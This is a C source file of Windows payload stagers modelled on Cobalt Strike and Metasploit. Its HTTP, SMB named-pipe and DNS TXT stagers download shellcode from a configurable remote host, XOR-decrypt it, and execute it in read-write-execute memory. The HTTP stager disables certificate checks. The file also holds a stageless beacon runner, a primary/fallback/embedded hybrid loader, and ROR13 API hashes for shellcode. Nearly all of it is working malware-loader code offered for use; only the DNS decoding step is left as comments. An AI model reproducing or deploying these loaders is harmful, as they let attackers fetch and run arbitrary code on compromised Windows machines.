/*
 * Staged vs Stageless - Payload delivery patterns
 * CS/Metasploit stager techniques
 */

#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

// ============================================================================
// STAGER CONFIG
// ============================================================================

#pragma pack(push,1)
typedef struct {
    WCHAR host[64];
    WORD  port;
    WCHAR uri[64];
    BYTE  key;
} STAGER_CFG;
#pragma pack(pop)

// ============================================================================
// HTTP STAGER - Download + exec
// ============================================================================

BOOL stager_http(STAGER_CFG* cfg)
{
    HINTERNET hS = 0, hC = 0, hR = 0;
    BYTE* sc = 0;
    BOOL ret = 0;

    hS = WinHttpOpen(L"A", 0, 0, 0, 0);
    if(!hS) return 0;

    hC = WinHttpConnect(hS, cfg->host, cfg->port, 0);
    if(!hC) goto end;

    hR = WinHttpOpenRequest(hC, L"GET", cfg->uri, 0, 0, 0, 0x800000);
    if(!hR) goto end;

    DWORD flags = 0x3300;  // Ignore SSL errors
    WinHttpSetOption(hR, 31, &flags, sizeof(flags));

    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    DWORD sz, dl, total = 0;
    sc = HeapAlloc(GetProcessHeap(), 0, 1);

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;
        sc = HeapReAlloc(GetProcessHeap(), 0, sc, total + sz);
        WinHttpReadData(hR, sc + total, sz, &dl);
        total += dl;
    } while(sz);

    // Decrypt if key
    if(cfg->key) {
        for(DWORD i = 0; i < total; i++)
            sc[i] ^= cfg->key;
    }

    // Exec stage1
    LPVOID mem = VirtualAlloc(0, total, 0x3000, 0x40);
    if(mem) {
        for(DWORD i = 0; i < total; i++)
            ((BYTE*)mem)[i] = sc[i];
        ((void(*)())mem)();
        ret = 1;
    }

end:
    if(sc) HeapFree(GetProcessHeap(), 0, sc);
    if(hR) WinHttpCloseHandle(hR);
    if(hC) WinHttpCloseHandle(hC);
    if(hS) WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// SMB STAGER - Named pipe delivery
// ============================================================================

BOOL stager_smb(char* pipe)
{
    HANDLE hP = CreateFileA(pipe, 0xC0000000, 0, 0, 3, 0, 0);
    if(hP == INVALID_HANDLE_VALUE) return 0;

    BYTE* sc = HeapAlloc(GetProcessHeap(), 0, 0x100000);
    DWORD total = 0, rd;

    while(ReadFile(hP, sc + total, 0x100000 - total, &rd, 0) && rd)
        total += rd;

    CloseHandle(hP);

    LPVOID mem = VirtualAlloc(0, total, 0x3000, 0x40);
    if(!mem) {
        HeapFree(GetProcessHeap(), 0, sc);
        return 0;
    }

    for(DWORD i = 0; i < total; i++)
        ((BYTE*)mem)[i] = sc[i];

    HeapFree(GetProcessHeap(), 0, sc);
    ((void(*)())mem)();
    return 1;
}

// ============================================================================
// DNS STAGER - TXT record delivery
// ============================================================================

BOOL stager_dns(char* domain, BYTE key)
{
    // Resolve TXT records to get shellcode chunks
    // Format: chunk0.domain, chunk1.domain, etc.
    // Each TXT = base64 encoded chunk

    BYTE* sc = HeapAlloc(GetProcessHeap(), 0, 0x100000);
    DWORD total = 0;
    int chunk = 0;
    char qname[256];

    while(1) {
        wsprintfA(qname, "%d.%s", chunk, domain);

        PDNS_RECORD rec = 0;
        if(DnsQuery_A(qname, 16, 8, 0, &rec, 0) != 0)  // DNS_TYPE_TEXT
            break;

        if(rec && rec->wType == 16) {
            // Decode base64 from rec->Data.TXT.pStringArray[0]
            // Add to sc buffer
            // total += decoded_len;
        }

        DnsRecordListFree(rec, 0);
        chunk++;
        if(chunk > 100) break;  // Safety limit
    }

    if(total == 0) {
        HeapFree(GetProcessHeap(), 0, sc);
        return 0;
    }

    // Decrypt
    for(DWORD i = 0; i < total; i++)
        sc[i] ^= key;

    LPVOID mem = VirtualAlloc(0, total, 0x3000, 0x40);
    for(DWORD i = 0; i < total; i++)
        ((BYTE*)mem)[i] = sc[i];

    HeapFree(GetProcessHeap(), 0, sc);
    ((void(*)())mem)();
    return 1;
}

// ============================================================================
// STAGE1 FORMAT - What stager downloads
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD magic;        // 0xBEEFCAFE
    DWORD total;        // Total size
    DWORD code_off;     // Code offset
    DWORD code_sz;      // Code size
    DWORD cfg_off;      // Config offset
    DWORD cfg_sz;       // Config size
    BYTE  key;          // XOR key
    BYTE  pad[7];
} STAGE1_HDR;
#pragma pack(pop)

BOOL parse_stage1(BYTE* data, DWORD len)
{
    STAGE1_HDR* h = (STAGE1_HDR*)data;

    if(h->magic != 0xBEEFCAFE) return 0;
    if(h->total > len) return 0;

    BYTE* code = data + h->code_off;
    BYTE* cfg = data + h->cfg_off;

    // Decrypt
    for(DWORD i = 0; i < h->code_sz; i++)
        code[i] ^= h->key;
    for(DWORD i = 0; i < h->cfg_sz; i++)
        cfg[i] ^= h->key;

    // Alloc + exec
    LPVOID mem = VirtualAlloc(0, h->code_sz, 0x3000, 0x40);
    if(!mem) return 0;

    for(DWORD i = 0; i < h->code_sz; i++)
        ((BYTE*)mem)[i] = code[i];

    ((void(*)())mem)();
    return 1;
}

// ============================================================================
// STAGELESS - Embedded beacon
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD magic;
    DWORD beacon_sz;
    DWORD cfg_off;
    DWORD cfg_sz;
    BYTE  code[];
} STAGELESS_HDR;
#pragma pack(pop)

// Placeholder for embedded beacon
static BYTE g_beacon[] = { 0xCC, 0xC3 };

void stageless_run(void)
{
    LPVOID mem = VirtualAlloc(0, sizeof(g_beacon), 0x3000, 0x40);
    if(!mem) return;

    for(DWORD i = 0; i < sizeof(g_beacon); i++)
        ((BYTE*)mem)[i] = g_beacon[i];

    ((void(*)())mem)();
}

// ============================================================================
// HYBRID - Try staged, fallback to embedded
// ============================================================================

#pragma pack(push,1)
typedef struct {
    STAGER_CFG primary;
    STAGER_CFG fallback;
    BYTE       embedded[0x1000];
    DWORD      embedded_sz;
} HYBRID_CFG;
#pragma pack(pop)

BOOL hybrid_run(HYBRID_CFG* cfg)
{
    // Try primary
    if(stager_http(&cfg->primary))
        return 1;

    // Try fallback
    if(stager_http(&cfg->fallback))
        return 1;

    // Use embedded
    if(cfg->embedded_sz > 0) {
        LPVOID mem = VirtualAlloc(0, cfg->embedded_sz, 0x3000, 0x40);
        if(mem) {
            for(DWORD i = 0; i < cfg->embedded_sz; i++)
                ((BYTE*)mem)[i] = cfg->embedded[i];
            ((void(*)())mem)();
            return 1;
        }
    }

    return 0;
}

// ============================================================================
// ROR13 HASH - For minimal stagers
// ============================================================================

DWORD ror13(char* s)
{
    DWORD h = 0;
    while(*s) {
        h = (h >> 13) | (h << 19);
        h += *s++;
    }
    return h;
}

// API hashes for shellcode stagers
#define H_KERNEL32       0x6A4ABC5B
#define H_LOADLIBRARYA   0xEC0E4E8E
#define H_GETPROCADDRESS 0x7C0DFCAA
#define H_VIRTUALALLOC   0x91AFCA54

// ============================================================================
// EOF
// ============================================================================
